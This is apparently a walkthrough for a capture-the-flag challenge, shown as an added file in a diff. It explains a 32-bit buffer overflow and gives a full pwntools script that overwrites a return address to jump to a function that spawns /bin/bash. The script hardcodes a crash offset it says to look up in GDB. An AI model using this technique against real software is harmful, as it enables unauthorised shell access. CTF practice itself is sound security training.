@@ -1,0 +1,87 @@
+To solve this challenge using pwntools, you need to exploit the buffer overflow in the `vulnerable_function` to redirect the execution flow to the `not_called` function, which calls `system("/bin/bash")` and gives you a shell. Here are the steps and the corresponding code to achieve this:
+
+### Steps
+
+1. **Identify the Buffer Overflow:**
+   - The `vulnerable_function` reads 256 bytes (`0x100u`) into a buffer of size 136 bytes, causing a buffer overflow.
+
+2. **Determine the Offset:**
+   - You need to determine the exact offset at which the return address is overwritten. This can be done using a pattern and checking the value of the EIP (Instruction Pointer) when it crashes.
+
+3. **Find the Address of `not_called`:**
+   - Use `objdump` or `gdb` to find the address of the `not_called` function.
+
+4. **Craft the Payload:**
+   - Create a payload that overwrites the return address with the address of `not_called`.
+
+5. **Exploit the Vulnerability:**
+   - Send the crafted payload to the binary using pwntools.
+
+### Code
+
+Here's the Python script using pwntools to exploit the vulnerability:
+
+```python
+from pwn import *
+
+# Set up the context
+context.binary = './your_binary_name'  # Replace with your binary name
+context.arch = 'i386'
+context.log_level = 'debug'
+
+# Start the process
+p = process(context.binary.path)
+
+# Find the address of not_called
+not_called_addr = 0x080484A4  # Replace with the actual address if different
+
+# Determine the offset to overwrite the return address
+# Generate a unique pattern
+pattern = cyclic(256)
+p.sendline(pattern)
+p.wait()  # Wait for the process to crash
+
+# Use gdb to find the offset
+# gdb.attach(p, "run\n")
+# Check the value of EIP in GDB after the crash
+# e.g., EIP: 0x6161616a -> offset = cyclic_find(0x6161616a)
+offset = cyclic_find(0x6161616a)  # Replace with the actual value from GDB
+
+# Craft the payload
+payload = b'A' * offset  # Padding to reach the return address
+payload += p32(not_called_addr)  # Overwrite the return address with the address of not_called
+
+# Send the payload
+p = process(context.binary.path)
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+### Explanation
+
+1. **Context Setup:**
+   - `context.binary` sets the binary file.
+   - `context.arch` specifies the architecture.
+   - `context.log_level` sets the logging level for debugging.
+
+2. **Process Start:**
+   - `process(context.binary.path)` starts the binary in a new process.
+
+3. **Address of `not_called`:**
+   - `not_called_addr` is set to the address of the `not_called` function. You can use `objdump -d your_binary_name | grep not_called` to find this address.
+
+4. **Determine the Offset:**
+   - A unique pattern is generated and sent to the binary to cause a crash.
+   - Use GDB to find the value of EIP and determine the offset using `cyclic_find`.
+
+5. **Craft the Payload:**
+   - `b'A' * offset` creates padding to reach the return address.
+   - `p32(not_called_addr)` packs the address of `not_called` into the payload.
+
+6. **Send the Payload:**
+   - The payload is sent to the binary.
+   - `p.interactive()` allows you to interact with the spawned shell.
+
+Make sure to replace `your_binary_name` with the actual name of the binary file you are working with. Also, ensure you have the correct address for `not_called` and the correct offset.
